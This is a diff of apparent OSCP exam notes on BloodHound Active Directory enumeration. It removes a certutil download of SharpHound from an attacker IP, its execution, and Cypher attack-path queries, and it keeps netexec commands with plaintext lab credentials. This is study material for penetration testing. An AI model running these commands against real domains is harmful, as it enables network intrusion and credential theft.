@@ -835,32 +835,10 @@ impacket-secretsdump oscp/emmet@10.10.1.202
 ## Bloodhound
 
 ```jsx
-certutil -urlcache -split -f http://192.168.45.171/SharpHound.ps1
-Import-Module .\Sharphound.ps1
-Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Windows\Temp\
-```
-
-```jsx
 netexec ldap nara.nara-security.com -u Tracy.White -p 'zqwj041FGX' --bloodhound -c all -ns 192.168.181.30
 netexec ldap dc01.oscp.exam -u web_svc -p 'Diamond1' --bloodhound -c all -ns 10.10.184.146
 ```
 
-```jsx
-sudo neo4j start
-```
-
-```jsx
-bloodhound
-```
-
-```jsx
-MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
-```
-
-```jsx
-MATCH p=shortestPath((n)-[:Owns|GenericAll|GenericWrite|WriteOwner|WriteDacl|MemberOf|ForceChangePassword|AllExtendedRights|AddMember|HasSession|Contains|GPLink|AllowedToDelegate|TrustedBy|AllowedToAct|AdminTo|CanPSRemote|CanRDP|ExecuteDCOM|HasSIDHistory|AddSelf|DCSync|ReadLAPSPassword|ReadGMSAPassword|DumpSMSAPassword|SQLAdmin|AddAllowedToAct|WriteSPN|AddKeyCredentialLink|SyncLAPSPassword|WriteAccountRestrictions|GoldenCert|ADCSESC1|ADCSESC3|ADCSESC4|ADCSESC5|ADCSESC6a|ADCSESC6b|ADCSESC7|ADCSESC9a|ADCSESC9b|ADCSESC10a|ADCSESC10b|ADCSESC13|DCFor*1..]->(g:Group))
-WHERE g.objectid ENDS WITH "-512" AND n<>g
-RETURN p
 ```
 
 ## Netexec - Spray credentials
